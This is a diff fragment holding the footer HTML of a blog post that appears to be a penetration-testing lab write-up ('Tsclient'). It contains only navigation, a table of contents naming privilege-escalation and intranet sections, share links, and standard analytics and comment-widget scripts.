+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">数据库提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">3.</span> <span class="toc-text">映像劫持</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&text=春秋云境-Tsclient"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&is_video=false&description=春秋云境-Tsclient"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Tsclient&body=Check out this article: https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&name=春秋云境-Tsclient&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/&t=春秋云境-Tsclient"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
